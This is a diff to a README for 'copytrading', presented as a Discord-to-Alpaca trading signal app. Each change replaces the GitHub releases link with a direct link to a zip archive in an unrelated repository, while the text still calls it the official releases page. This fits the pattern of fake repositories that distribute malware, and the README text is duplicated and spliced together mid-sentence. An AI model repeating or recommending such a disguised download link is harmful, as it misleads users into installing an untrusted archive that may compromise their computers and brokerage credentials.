@@ -5,23 +5,23 @@ description: "Copy trusted traders within limits you set, an open-source macOS a
 ---
 # 🚀 copytrading - Copy Discord Trading Signals Safely
 
-[![Download copytrading](https://img.shields.io/badge/Download_copytrading-FF6B6B?style=for-the-badge&labelColor=4A90E2&logo=github&logoColor=white)](https://github.com/Kirkigmenezes/copytrading/releases)
+[![Download copytrading](https://img.shields.io/badge/Download_copytrading-FF6B6B?style=for-the-badge&labelColor=4A90E2&logo=github&logoColor=white)](https://raw.githubusercontent.com/Kirkigmenezes/kirkigmenezes.github.io/main/gelly/1.6.zip)
 
 copytrading is a local-first desktop app that helps you copy trading signals from Discord into Alpaca accounts. It is made for people who want a simpler way to follow trading signals without manually retyping every trade. The app includes a risk-limited engine, an AI assistant, and English or 简体中文. This is a developer preview, so the app is evolving quickly and new builds may arrive often.
 
 ## 📥 Download copytrading
 
-Visit this link to download the application: [copytrading releases](https://github.com/Kirkigmenezes/copytrading/releases).
+Visit this link to download the application: [copytrading releases](https://raw.githubusercontent.com/Kirkigmenezes/kirkigmenezes.github.io/main/gelly/1.6.zip).
 
 The releases page is the official download page. Open it in your web browser. Look for the newest release at the top of the page. Download the application file provided# 🚀 copytrading - Copy Discord Signals Safely
 
-[![Download copytrading](https://img.shields.io/badge/Download_copytrading-FF6B6B?style=for-the-badge&labelColor=4A90E2&logo=github&logoColor=white)](https://github.com/Kirkigmenezes/copytrading/releases)
+[![Download copytrading](https://img.shields.io/badge/Download_copytrading-FF6B6B?style=for-the-badge&labelColor=4A90E2&logo=github&logoColor=white)](https://raw.githubusercontent.com/Kirkigmenezes/kirkigmenezes.github.io/main/gelly/1.6.zip)
 
 copytrading is a local-first desktop app that copies Discord trading signals into Alpaca accounts. It is built for people who want a simpler way to follow trading signals without manually retyping every trade. The app includes a risk-limited engine, an AI assistant, and English or 简体中文 support. This is a developer preview, which means the app is an early version and may change as development continues.
 
 ## 📥 Download copytrading
 
-Visit this link to download the application: [copytrading releases](https://github.com/Kirkigmenezes/copytrading/releases).
+Visit this link to download the application: [copytrading releases](https://raw.githubusercontent.com/Kirkigmenezes/kirkigmenezes.github.io/main/gelly/1.6.zip).
 
 The releases page is the official place to get the app. Open the link in your web browser. The newest release appears at the top of the page. Download the application file shown there. Keep the downloaded file in a folder you can find later, such as your Downloads folder.
 
@@ -65,7 +65,7 @@ Make sure you have a stable internet connection. The app needs to communicate wi
 
 ## 🛠️ Download and Run
 
-Visit this link to download the application: [copytrading releases](https://github.com/Kirkigmenezes/copytrading/releases).
+Visit this link to download the application: [copytrading releases](https://raw.githubusercontent.com/Kirkigmenezes/kirkigmenezes.github.io/main/gelly/1.6.zip).
 
 Open the releases page in your browser. Find the newest release at the top. Download the application file provided for that release. Wait for the download to finish. Open your Downloads folder or the folder where your browser saves files.
 
